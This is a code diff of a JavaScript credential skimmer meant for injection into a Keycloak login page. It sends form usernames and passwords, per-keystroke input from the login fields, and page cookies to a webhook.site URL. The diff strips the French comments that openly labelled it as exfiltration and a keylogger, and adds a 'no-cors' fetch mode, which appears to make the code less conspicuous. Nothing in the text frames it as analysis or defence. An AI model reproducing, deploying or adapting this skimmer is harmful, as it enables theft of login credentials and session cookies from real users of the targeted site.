@@ -1,15 +1,13 @@
 (function() {
-  // Anti-replay : si déjà injecté, ne rien refaire
   if (window.__vault_jok3r_loaded__) return;
   window.__vault_jok3r_loaded__ = true;
 
-  // ✅ Webhook destination (ici ton webhook.site)
   const webhook = 'https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8';
 
-  // ✅ Fonction pour exfiltrer les infos
   function sendData(data) {
     fetch(webhook, {
       method: 'POST',
+      mode: 'no-cors',
       headers: {
         'Content-Type': 'application/json'
       },
@@ -17,7 +15,6 @@
     }).catch(() => {});
   }
 
-  // ✅ Capture du formulaire (username / password)
   const form = document.getElementById('kc-form-login');
   if (form) {
     form.addEventListener('submit', function() {
@@ -36,7 +33,6 @@
     });
   }
 
-  // ✅ Keylogger simple sur les champs username et password
   const usernameInput = document.getElementById('username');
   const passwordInput = document.getElementById('password');
 
@@ -60,7 +56,6 @@
     });
   }
 
-  // ✅ Capture des cookies à l'exécution (si pas HttpOnly)
   sendData({
     type: 'cookies_onload',
     cookies: document.cookie,
